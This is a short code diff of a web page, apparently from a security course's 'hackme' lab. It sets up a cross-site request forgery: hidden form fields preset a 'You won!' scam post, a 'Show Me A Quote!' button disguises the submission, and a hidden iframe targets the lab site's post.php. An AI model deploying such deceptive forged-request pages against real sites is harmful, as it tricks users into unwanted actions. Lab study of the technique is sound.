@@ -92,7 +92,7 @@ body{
 						<input name="post_submit" value="set" type="hidden">
 						<input name="title" value="You won!" type="hidden">
 						<input name="message" value="You have been selected for a free flying dragon ride." type="hidden">
-            <input id="quoteButton" name="post_submit" type="submit" value="Show Me A Quote!">
+            <input id="quoteButton" name="post_submit" type="button" value="Show Me A Quote!">
         </form>
 				<iframe src="http://infosec-020-105/hackme-personal/post.php?" style="display: none;" name="myframe" id="myframe"></iframe>
       </div>
@@ -107,7 +107,6 @@ body{
   $('#submission').submit(function(event) {
       // submit the form
       //event.preventDefault();
-			return true;
   });
 
     $(document).ready(function(){
